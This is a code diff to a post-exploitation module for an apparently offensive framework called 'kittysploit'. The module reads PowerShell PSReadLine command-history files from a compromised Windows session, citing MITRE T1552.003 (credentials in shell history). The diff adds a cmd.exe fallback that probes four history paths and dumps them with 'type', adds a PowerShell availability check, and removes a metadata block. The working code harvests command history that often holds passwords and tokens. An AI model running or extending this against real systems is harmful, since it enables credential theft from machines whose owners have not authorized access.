@@ -3,6 +3,8 @@
 
 """
 Read PSReadLine ConsoleHost_history.txt from a Windows session.
+
+Works from cmd.exe by typing the history files directly. PowerShell is optional.
 """
 
 from kittysploit import *
@@ -12,6 +14,14 @@ import re
 import time
 
 _LOCAL_OUT = "output"
+
+# Common PSReadLine history locations (expanded via cmd env vars)
+_HISTORY_CANDIDATES = (
+    r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+    r"%APPDATA%\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",
+    r"%LOCALAPPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+    r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+)
 
 
 class Module(Post):
@@ -27,68 +37,16 @@ class Module(Post):
         "references": [
             "https://attack.mitre.org/techniques/T1552.003/",
         ],
-    'agent': {
-        'risk': 'intrusive',
-        'effects': ['active_exploitation'],
-        'expected_requests': 2,
-        'reversible': False,
-        'approval_required': True,
-        'produces': ['risk_signals'],
-        'cost': 1.5,
-        'noise': 0.5,
-        'value': 1.0,
-        'requires':         {'min_endpoints': 0,
-         'min_params': 0,
-         'tech_hints_any': [],
-         'tech_hints_all': [],
-         'specializations_any': [],
-         'risk_signals_any': [],
-         'auth_session': False,
-         'capabilities_any': [],
-         'capabilities_all': [],
-         'confidence_min': {},
-         'confidence_min_any': {},
-         'endpoint_pattern_any': [],
-         'param_any': [],
-         'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 's7comm', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''}],
-         'consumes_capabilities': [],
-         'option_bindings': {},
-         'suggested_followups': []},
-    },
     }
 
     save_local = OptBool(True, "Save history under ./output", False)
     max_lines = OptInteger(500, "Maximum lines to return per history file", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell when available (default: type history via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -118,6 +76,21 @@ class Module(Post):
         if minimum is not None and n < minimum:
             n = minimum
         return n
+
+    def _compat_failure(self):
+        """Prefer NotCompatible when present (post-reload); else NoTarget."""
+        return getattr(FailureType, "NotCompatible", None) or FailureType.NoTarget
+
+    def _powershell_available(self) -> bool:
+        for cmd in (
+            'powershell -NoP -NonI -Command "Write-Output PS_OK"',
+            'powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
+            r'%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
+        ):
+            out = self._execute_cmd(cmd)
+            if out and "PS_OK" in out:
+                return True
+        return False
 
     def _powershell_script(self, max_lines: int) -> str:
         return f"""
@@ -149,11 +122,46 @@ if ($sections.Count -eq 0) {{
 }}
 """
 
+    def _tail_lines(self, text: str, limit: int) -> str:
+        lines = (text or "").splitlines()
+        if len(lines) <= limit:
+            return "\n".join(lines)
+        return "\n".join(lines[-limit:])
+
+    def _extract_via_cmd(self, limit: int) -> str:
+        sections = []
+        for pattern in _HISTORY_CANDIDATES:
+            # Expand env and test existence in one cmd chain
+            check = self._execute_cmd(f'if exist "{pattern}" (echo EXISTS) else (echo MISSING)')
+            if not check or "EXISTS" not in check:
+                continue
+            # Resolve display path
+            resolved = self._execute_cmd(f'echo {pattern}') or pattern
+            resolved = resolved.strip().splitlines()[-1].strip() if resolved else pattern
+            content = self._execute_cmd(f'type "{pattern}"')
+            if content is None:
+                content = ""
+            # Filter obvious cmd noise / "file not found"
+            if re.search(r"cannot find|not found|The system cannot find", content, re.I):
+                continue
+            body = self._tail_lines(content, limit)
+            nlines = len(body.splitlines()) if body else 0
+            if limit and nlines >= limit:
+                header = f"=== {resolved} (last {limit} lines) ==="
+            else:
+                header = f"=== {resolved} ({nlines} lines) ==="
+            sections.append(f"{header}\n{body}")
+
+        if not sections:
+            return "No PowerShell history files found."
+        return "\n\n".join(sections)
+
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
+        # History files are readable via cmd; only need a live Windows session
+        probe = self._execute_cmd("echo %OS%")
+        if probe and "windows" not in probe.lower() and "Windows_NT" not in probe:
+            # Soft check — adaptive shells may echo noisy output
+            print_warning("Could not confirm Windows via %OS%; continuing anyway")
         return True
 
     def _save_output(self, content: str) -> str:
@@ -166,11 +174,19 @@ if ($sections.Count -eq 0) {{
 
     def run(self):
         if not self.check():
-            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")
+            raise ProcedureError(self._compat_failure(), "PowerShell history prerequisites not met")
 
         limit = self._int_opt(self.max_lines, 500, 1)
         print_status("Reading PowerShell command history...")
-        result = self._run_powershell(self._powershell_script(limit))
+
+        use_ps = self._bool_opt(self.prefer_powershell, False) and self._powershell_available()
+        if use_ps:
+            print_info("Using PowerShell")
+            result = self._run_powershell(self._powershell_script(limit))
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — reading history via cmd")
+            result = self._extract_via_cmd(limit)
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
